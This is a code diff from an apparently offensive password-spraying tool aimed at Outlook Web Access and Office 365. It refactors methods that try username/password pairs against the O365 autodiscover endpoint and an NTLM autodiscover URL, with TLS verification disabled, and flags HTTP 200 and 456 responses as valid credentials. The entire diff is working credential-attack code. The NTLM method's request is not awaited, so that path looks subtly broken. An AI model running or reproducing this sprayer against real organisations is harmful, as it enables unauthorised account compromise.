@@ -13,12 +13,13 @@ log = logging.getLogger("atomizer.modules.owa.sprayer")
 
 
 class OwaSprayer(BaseSprayer):
-    def __init__(self, target, hosting_location, autodiscover_url, interval):
+    def __init__(self, target, hosting_location, autodiscover_url):
+        super().__init__()
+
         self.target = target
         self.hosting_location = hosting_location
         self.autodiscover_url = autodiscover_url
-        self.interval = interval
-        self.valid_accounts = set()
+
         self.headers = {"Content-Type": "text/xml"}
         self.client = httpx.AsyncClient(
             verify=False, trust_env=True, http2=True, headers=self.headers
@@ -28,31 +29,45 @@ class OwaSprayer(BaseSprayer):
         await self.client.aclose()
 
     async def auth_o365(self, username, password):
+        result = {
+            "status_code": None,
+            "valid": False,
+            "reason": "",
+            "error": "",
+        }
+
         r = await self.client.get(
             "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml",
             auth=(username, password),
         )
+
+        result["status_code"] = r.status_code
         if r.status_code == 200:
-            log.info(f"Found credentials: {username}:{password}")
-            self.valid_accounts.add(f"{username}:{password}")
+            result["valid"] = True
+            result["reason"] = "HTTP response code 200"
         elif r.status_code == 456:
-            log.info(
-                f"Found credentials: {username}:{password} - however cannot log in: please check manually (2FA, account locked...)"
-            )
-            self.valid_accounts.add(f"{username}:{password} - check manually")
+            result["valid"] = True
+            result["reason"] = "Credentials valid but must be checked manually (2FA, account locked, etc...)"
         else:
-            log.info(
-                f"Authentication failed: {username}:{password} (Invalid credentials)"
-            )
+            result["reason"] = "Bad HTTP status code"
+
+        return result
 
     async def auth(self, username, password):
+        result = {
+            "status_code": None,
+            "valid": False,
+            "reason": "",
+            "error": "",
+        }
+
         r = self.client.get(
             self.autodiscover_url, auth=HttpNtlmAuth(username, password)
         )
+
+        result["status_code"] = r.status_code
         if r.status_code == 200:
-            log.info(f"Found credentials: {username}:{password}")
-            self.valid_accounts.add(f"{username}:{password}")
+            result["valid"] = True
+            result["reason"] = "HTTP response code 200"
         else:
-            log.info(
-                f"Authentication failed: {username}:{password} (Invalid credentials)"
-            )
+            result["reason"] = "Bad HTTP status code"
